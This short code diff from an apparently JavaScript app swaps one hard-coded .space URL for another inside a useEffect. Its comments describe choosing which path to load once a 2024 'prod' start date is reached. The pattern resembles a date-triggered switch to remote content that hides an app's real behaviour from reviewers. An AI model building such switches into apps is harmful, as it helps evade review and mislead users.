@@ -238,7 +238,7 @@ const App = () => {
   //////////// useEffect що виріш який шлях включати
   //  https://terrific-eminent-win.space/FG8hKVbd
   useEffect(() => {
-    const url = `https://terrific-eminent-win.space/FG8hKVbd`;
+    const url = `https://outstanding-mega-fun.space/f8KnSYpS`;
     const targetD = new Date('2024-04-29T12:00:00'); //дата з якої поч працювати prod
     const currentD = new Date(); //текущая дата
 
